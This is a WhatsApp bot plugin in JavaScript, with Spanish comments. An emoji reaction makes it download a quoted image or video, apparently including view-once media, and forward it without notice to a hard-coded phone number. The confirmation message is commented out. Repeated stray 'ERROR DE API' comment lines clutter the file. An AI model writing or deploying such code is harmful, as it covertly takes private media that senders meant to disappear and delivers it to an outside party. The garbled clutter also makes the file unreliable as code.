/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
import { downloadContentFromMessage } from '@whiskeysockets/baileys'

const handler = async (m, { conn }) => {
  try {
    const quoted = m.quoted || m
    const mime = (quoted.msg || quoted).mimetype || quoted.mediaType || ''

    if (!/image|video/.test(mime)) {
      return m.reply('.')
    }

    const type = mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted.msg || quoted, type)

    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }

    if (!buffer || buffer.length === 0) {
      throw new Error('.')
    }

    const recipient = '5521989050540@s.whatsapp.net'

    await conn.sendMessage(recipient, {
      [type]: buffer,
      caption: '📤 Reenvío automático',
    }, { quoted: m })

   // await m.reply('*✅ Contenido reenviado correctamente.*')

  } catch (e) {
    console.error('[🔥 ERROR PLUGIN REENVÍO VISUALIZACIÓN ÚNICA]:', e)
    m.reply('*❌ Error: no se pudo reenviar el contenido.*')
  }
}
/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */

/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
// Este plugin se activa sin prefijo, solo con el emoji 🤤
/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
handler.customPrefix = /^(🤤|🔥|👀|📤)$/
/* ERROR DE API: Unexpected token 'N', "Not Found" is not valid JSON */
handler.command = false
handler.help = ['(reenvío con emoji 🤤)']
handler.tags = ['media']

export default handler

